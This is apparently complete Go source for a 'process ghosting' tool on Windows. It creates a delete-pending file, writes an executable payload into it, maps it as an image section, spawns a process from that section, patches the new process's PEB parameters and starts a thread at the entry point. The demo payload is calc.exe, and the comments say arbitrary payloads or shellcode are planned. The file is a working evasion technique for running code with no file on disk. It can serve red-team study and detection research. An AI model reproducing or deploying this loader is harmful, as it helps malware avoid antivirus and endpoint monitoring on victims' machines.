package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modKernel32                    = syscall.NewLazyDLL("kernel32.dll")
	modNtdll                       = syscall.NewLazyDLL("ntdll.dll")
	procReadProcessMemory          = modKernel32.NewProc("ReadProcessMemory")
	procWriteProcessMemory         = modKernel32.NewProc("WriteProcessMemory")
	procVirtualAllocEx             = modKernel32.NewProc("VirtualAllocEx")
	procSetInformation             = modNtdll.NewProc("NtSetInformationFile")
	procNtCreateProcess            = modNtdll.NewProc("NtCreateProcess")
	procNtSuspendProcess           = modNtdll.NewProc("NtSuspendProcess")
	procCreateSection              = modNtdll.NewProc("NtCreateSection")
	procNtOpenFile                 = modNtdll.NewProc("NtOpenFile")
	procNtWriteFile                = modNtdll.NewProc("NtWriteFile")
	procNtClose                    = modNtdll.NewProc("NtClose")
	procNtQueryInformationProcess  = modNtdll.NewProc("NtQueryInformationProcess")
	procNtReadVirtualMemory        = modNtdll.NewProc("NtReadVirtualMemory")
	procNtCreateThreadEx           = modNtdll.NewProc("NtCreateThreadEx")
	procRtlCreateProcessParameters = modNtdll.NewProc("RtlCreateProcessParameters")
)

const (
	FILE_DELETE                  = 0x00010000
	SYNCHRONIZE                  = 0x00100000
	GENERIC_READ                 = 0x80000000
	GENERIC_WRITE                = 0x40000000
	FILE_SHARE_READ              = 0x00000001
	FILE_SHARE_WRITE             = 0x00000002
	FILE_SUPERSEDE               = 0x00000000
	FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020
	OBJ_CASE_INSENSITIVE         = 0x00000040

	SEC_COMMIT      = 0x8000000
	SECTION_WRITE   = 0x2
	SECTION_READ    = 0x4
	SECTION_EXECUTE = 0x8
	SECTION_ALL     = 0x1 | SECTION_READ | SECTION_WRITE | SECTION_EXECUTE | 0x10 | 0xf0000
)

// windows.PEB is truncated?! Had to add this structure myself. Will make a pull request
type PEB struct {
	InheritedAddressSpace    byte
	ReadImageFileExecOptions byte
	BeingDebugged            byte
	BitField                 byte
	Mutant                   uintptr
	ImageBaseAddress         uintptr
	Ldr                      *windows.PEB_LDR_DATA
	ProcessParameters        *windows.RTL_USER_PROCESS_PARAMETERS
	SubSystemData            uintptr
	ProcessHeap              uintptr
	FastPebLock              uintptr
	AtlThunkSListPtr         uintptr
	reserved5                uintptr
	reserved6                uint32
	reserved7                uintptr
	reserved8                uint32
	AtlThunkSListPtr32       uint32
	reserved9                [45]uintptr
	reserved10               [96]byte
	PostProcessInitRoutine   uintptr
	reserved11               [128]byte
	reserved12               [1]uintptr
	SessionId                uint32
}

type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            syscall.Handle
	ObjectName               uintptr // UNICODE
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type PROCESS_BASIC_INFORMATION struct {
	ExitStatus                   NTStatus
	PebBaseAddress               *windows.PEB
	AffinityMask                 uintptr
	BasePriority                 int32
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessId uintptr
}

type NTStatus uint32

type IO_STATUS_BLOCK struct {
	Status      NTStatus
	Information uintptr
}

type FILE_DISPOSITION_INFORMATION struct {
	DeleteFile bool
}

func readProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr) uintptr {
	data := readProcessMemory(hProcess, lpBaseAddress, 8)
	val := uintptr(binary.LittleEndian.Uint64(data))
	return val
}

func rpmAs32BitAddr(hProcess uintptr, lpBaseAddress uintptr) uintptr {
	data := readProcessMemory(hProcess, lpBaseAddress, 4)
	val := uintptr(binary.LittleEndian.Uint32(data))
	return val
}
func readProcessMemory(hprocess uintptr, lpBaseAddress uintptr, size uint32) []byte {
	var bytesread uintptr
	data := make([]byte, size)

	r, _, err := procReadProcessMemory.Call(hprocess, lpBaseAddress, uintptr(unsafe.Pointer(&data[0])), uintptr(size), uintptr(unsafe.Pointer(&bytesread)))

	if r == 0 {
		fmt.Printf("[-] RPM broke with %v %v \n", r, err)
		os.Exit(-1)
	}
	return data
}

func setupProcessParams(hprocess uintptr, pi *windows.PROCESS_BASIC_INFORMATION, path string) {
	// utf16 strings
	wd, _ := os.Getwd()
	dirpath, _ := syscall.UTF16PtrFromString(wd)
	targetPath, _ := syscall.UTF16PtrFromString(path)
	windowName, _ := syscall.UTF16PtrFromString("Window Name!")
	dllpath, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32")
	commandLine, _ := syscall.UTF16PtrFromString("definitelyRealParams")
	// Allocating memory for the NTStrings we're about to create.
	var (
		environment = new(windows.PEB) //This didn't end up being too useful
		dir         = new(windows.NTUnicodeString)
		target      = new(windows.NTUnicodeString)
		window      = new(windows.NTUnicodeString)
		dll         = new(windows.NTUnicodeString)
		command     = new(windows.NTUnicodeString)
	)
	windows.RtlInitUnicodeString(dir, dirpath)
	windows.RtlInitUnicodeString(target, targetPath)
	windows.RtlInitUnicodeString(window, windowName)
	windows.RtlInitUnicodeString(dll, dllpath)
	windows.RtlInitUnicodeString(command, commandLine)
	//fmt.Printf("[+]Args are %v %v %v %v %v \n", dir, target, window, dll, command)

	//myPeb := windows.RtlGetCurrentPeb()
	//desktopInfo := myPeb.ProcessParameters.DesktopInfo
	params := new(windows.RTL_USER_PROCESS_PARAMETERS)
	env := (*uint16)(unsafe.Pointer(environment))
	//allocate an environment block at env
	windows.CreateEnvironmentBlock(&env, 0, true)
	status, _, err := procRtlCreateProcessParameters.Call(uintptr(unsafe.Pointer(&params)), uintptr(unsafe.Pointer(target)), uintptr(unsafe.Pointer(dll)), uintptr(unsafe.Pointer(dir)), uintptr(unsafe.Pointer(target)), uintptr(unsafe.Pointer(env)), uintptr(unsafe.Pointer(window)), 0, 0, 0)

	if status != 0 {
		fmt.Printf("[-] Setting process parameters failed. Status was 0x%x, %v %v \n", status, err, environment)
		os.Exit(-1)
	}
	envptr := writeParamsToProcess(hprocess, params)
	fmt.Printf("[+] envpointer is 0x%x, \n", envptr)
	writeParamsToPEB(hprocess, params, pi)
}

func writeParamsToPEB(hprocess uintptr, lpParams *windows.RTL_USER_PROCESS_PARAMETERS, stPBI *windows.PROCESS_BASIC_INFORMATION) bool {
	theirpeb := new(PEB)
	bytesread := 0
	lpBaseAddress := uintptr(unsafe.Pointer(stPBI.PebBaseAddress))
	r, _, err := procReadProcessMemory.Call(hprocess, lpBaseAddress, uintptr(unsafe.Pointer(theirpeb)), uintptr(unsafe.Sizeof(*theirpeb)), uintptr(unsafe.Pointer(&bytesread)))
	if r == 0 {
		fmt.Printf("[-] RPM broke with %v %v \n", r, err)
		return false
	}
	fmt.Printf("[+] Successfully read PEB \n")
	//This will be the address we just wrote to
	theirpeb.ProcessParameters = lpParams
	//write back the modified PEB
	status, _, _ := procWriteProcessMemory.Call(hprocess, lpBaseAddress, uintptr(unsafe.Pointer(theirpeb)), unsafe.Sizeof(*theirpeb), 0)
	if status == 0 {
		fmt.Printf("[-] Failed to write back PEB \n")
		return false
	}
	return true

}

func writeParamsToProcess(hprocess uintptr, lpParams *windows.RTL_USER_PROCESS_PARAMETERS) uintptr {
	// This is (probably) working now!
	length := lpParams.Length
	envbaseptr := unsafe.Pointer(lpParams)
	ptop := uintptr(uint64(uintptr(envbaseptr)) + uint64(length)) //RTL PARAMS BLOCK
	penv := lpParams.Environment
	ptopenv := lpParams.EnvironmentSize
	ulbuffersize := length + *(*uint32)(unsafe.Pointer(&ptopenv))
	fmt.Printf("[*] Sanity check! Values are envSize %v pbase 0x%x, ptop: 0x%x, length: %v, penv: 0x%x, bufferSize: %v \n", ptopenv, envbaseptr, ptop, length, penv, ulbuffersize)

	remotebufferbp, _, err := procVirtualAllocEx.Call(hprocess, uintptr(envbaseptr), uintptr(ulbuffersize), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if remotebufferbp == 0 {
		fmt.Printf("[-] Allocation Failed with %s \n", err)
		os.Exit(-1)
	}

	fmt.Printf("[+] Remote buffer is at 0x%x \n", remotebufferbp)

	status, _, _ := procWriteProcessMemory.Call(hprocess, uintptr(envbaseptr), uintptr(envbaseptr), uintptr(length), 0)
	if status == 0 {
		fmt.Printf("[-] Failed to write process parameters")
		os.Exit(-1)
	}
	status, _, _ = procWriteProcessMemory.Call(hprocess, uintptr(penv), uintptr(penv), uintptr(ulbuffersize-length), 0)
	if status == 0 {
		fmt.Printf("[-] Failed to write process parameters")
		os.Exit(-1)
	}
	data := readProcessMemory(hprocess, uintptr(envbaseptr), length+3016)
	fmt.Printf("[+] Success! Wrote %v to 0x%x \n", data[0:50], uintptr(envbaseptr))
	return uintptr(envbaseptr)
}

func writeFileAndCreateSection(fp uintptr, payload []byte) int32 {
	statusblock := IO_STATUS_BLOCK{0, 0}
	status, _, _ := procNtWriteFile.Call(fp, 0, 0, 0, uintptr(unsafe.Pointer(&statusblock)), uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), 0, 0) // please excuse magic numbers

	if status != 0 {
		fmt.Printf("[-] NtWriteFile broke with %v", status)
		os.Exit(-1)
	}
	var handle uintptr
	status2, _, _ := procCreateSection.Call(uintptr(unsafe.Pointer(&handle)), SECTION_ALL, 0, 0, syscall.PAGE_READONLY, 0x1000000, fp)

	if status2 != 0 || handle == uintptr(syscall.InvalidHandle) {
		fmt.Printf("[-] CreateSection broke with %x \n", status2)
		os.Exit(-1)
	}
	closed, _, _ := procNtClose.Call(uintptr(fp))
	if closed != 0 {
		fmt.Printf("File failed to close")
		os.Exit(-1)
	}

	var hprocess uintptr
	currentProcess, _ := syscall.GetCurrentProcess()

	status, _, _ = procNtCreateProcess.Call(uintptr(unsafe.Pointer(&hprocess)), 0xffff|0x000f0000|0x100000, 0, uintptr(currentProcess), 0, handle, 0, 0)
	if status != 0 {
		fmt.Printf("CreateProcess failed with %x \n", status)
		os.Exit(-1)
	}
	fmt.Printf("[+] hprocess is now 0x%x \n", hprocess)
	pbi := new(windows.PROCESS_BASIC_INFORMATION)
	size := uint32(unsafe.Sizeof(*pbi))
	err, _, _ := procNtQueryInformationProcess.Call(hprocess, 0, uintptr(unsafe.Pointer(pbi)), uintptr(size), uintptr(unsafe.Pointer(&size)))
	if err != 0 {
		fmt.Printf("[-] Process Information failed, size is %d, broke with status code 0%x \n", size, status)
		os.Exit(-1)
	}
	fmt.Printf("[+] Their PBI is %v \n", *pbi)
	imageBasePointer := uint64(uintptr(unsafe.Pointer(pbi.PebBaseAddress))) + 0x10
	fmt.Printf("[+] ImageBaseAddress in remote process is 0x%x \n", imageBasePointer)
	Pe := [...]byte{499: 0}
	baseAddr := readProcessMemoryAsAddr(hprocess, uintptr(imageBasePointer))

	if status != 0 {
		fmt.Printf("[-]Reading virtual memory failed at %v", imageBasePointer)
		os.Exit(-1)
	}

	fmt.Printf("[+] Read base address 0x%x \n", baseAddr)

	status, _, _ = procNtReadVirtualMemory.Call(hprocess, baseAddr, uintptr(unsafe.Pointer(&Pe[0])), 0x500, 0)
	if status != 0 {
		fmt.Printf("[-]Reading virtual memory failed at %v", baseAddr)
		os.Exit(-1)
	}

	///A lot of this can be omitted in the final version. These are just debugging reads/writes for my own peace of mind.
	fmt.Printf("[+] PE retrieved! Header should be : %c\n", Pe[0:2])
	e_lfanew := []byte{0, 0, 0, 0, 0, 0, 0, 0}
	e_lfanew[0] = Pe[0x3c]
	e_lfanew[1] = Pe[0x3d]
	e_lfanew[2] = Pe[0x3e]
	e_lfanew[3] = Pe[0x3f]
	opthdr := binary.LittleEndian.Uint64(e_lfanew) + uint64(baseAddr)
	fmt.Printf("[+] e_lfanew points to 0x%x \n", opthdr)      // PE header address
	bytes := readProcessMemory(hprocess, uintptr(opthdr), 50) // Fortunately, this does show the prelude for CALC!
	ep_rva := rpmAs32BitAddr(hprocess, uintptr(opthdr+0x28))
	fmt.Printf("[*] Optional Header Sanity Check: %c\n", bytes[0:4])
	fmt.Printf("[+] EP_rva was 0x%x\n", ep_rva)

	var hthread uintptr
	whprocess := windows.Handle(hprocess)
	pid, _ := windows.GetProcessId(whprocess)
	fmt.Printf("[+] PID is %v \n", pid)
	ep := uint64(ep_rva) + uint64(baseAddr)
	fmt.Printf("[+] EP_absolute is 0x%x \n", ep)
	checkEntryPoint(uintptr(ep), hprocess)

	// 1. Create an environment block and RTL_USER_PROCESS_PARAMETERS from functions.
	// 2. Allocate RTL_USER_PROCESS_PARAMETERS in remote process, as well as ENVIRONMENT, as these are typically contiguous anyway
	// 3. fix up pointer in remote PEB.
	// 4. ???
	// 5. profit
	temp := os.TempDir()
	strname := temp + "\\ghostly.exe"
	setupProcessParams(hprocess, pbi, strname)
	// There are SOOO MANY MAGIC NUMBERS
	status1, _, err1 := procNtCreateThreadEx.Call(uintptr(unsafe.Pointer(&hthread)), 0x1f0fff, 0, hprocess, uintptr(ep), 0, 0, 0, 0, 0, 0)
	if status1 != 0 {
		fmt.Printf("[-] Thread creation failed at 0x%x entrypoint. Status Code was 0x%x, error was %v \n", opthdr, status1, err1)
		os.Exit(-1)
	}

	fmt.Printf("[+] Success! Thread handle is %v \n", hthread)
	windows.WaitForSingleObject(windows.Handle(hprocess), syscall.INFINITE)
	return 0
}

func checkEntryPoint(ep uintptr, hprocess uintptr) {
	disas := readProcessMemory(hprocess, ep, 50)
	fmt.Printf("[+] disas is %x \n", disas)
}

func setInformation(fp uintptr) error {
	statusblock := IO_STATUS_BLOCK{0, 0}
	dispo := FILE_DISPOSITION_INFORMATION{true}
	ret, _, _ := procSetInformation.Call(fp, uintptr(unsafe.Pointer(&statusblock)), uintptr(unsafe.Pointer(&dispo)), unsafe.Sizeof(dispo), 13)
	if ret != 0 {
		fmt.Printf("setInformation broke with %x", ret)
		return errors.New("-1")
	}
	return nil
}

func main() {
	fmt.Println(`

	██████╗ ██████╗  ██████╗  ██████╗███████╗███████╗███████╗     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
	██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔════╝██╔════╝    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
	██████╔╝██████╔╝██║   ██║██║     █████╗  ███████╗███████╗    ██║  ███╗███████║██║   ██║███████╗   ██║   
	██╔═══╝ ██╔══██╗██║   ██║██║     ██╔══╝  ╚════██║╚════██║    ██║   ██║██╔══██║██║   ██║╚════██║   ██║   
	██║     ██║  ██║╚██████╔╝╚██████╗███████╗███████║███████║    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
	╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚══════╝╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
                                                                                                      `)

	fmt.Println("[+] Opening File for Reading")
	//In future, I'll write this to a temp directory
	//name, _ := syscall.UTF16PtrFromString("\\??\\c:\\users\\user\\documents\\ghostly.exe")
	temp := os.TempDir()
	fmt.Printf("[+] Temp path on this machine is %v \n", temp)
	strname := "\\??\\" + temp + "\\ghostly.exe"
	name, _ := syscall.UTF16PtrFromString(strname)
	dwAccessMode := uint32(syscall.GENERIC_READ | syscall.SYNCHRONIZE | syscall.GENERIC_WRITE | FILE_DELETE)
	targetFile, _ := syscall.CreateFile(name, dwAccessMode, 0, nil, syscall.CREATE_ALWAYS, syscall.FILE_ATTRIBUTE_NORMAL, 0)
	err := setInformation(uintptr(targetFile))
	if err != nil {
		fmt.Printf("Error was 0x%p", err)
		os.Exit(-1)
	}
	// Will configure this to load arbitrary payloads in future. Should be able to wrap shellcode in some tiny PE stuff?
	readfile, _ := os.ReadFile("c:\\windows\\system32\\calc.exe")
	writeFileAndCreateSection(uintptr(targetFile), readfile)
}
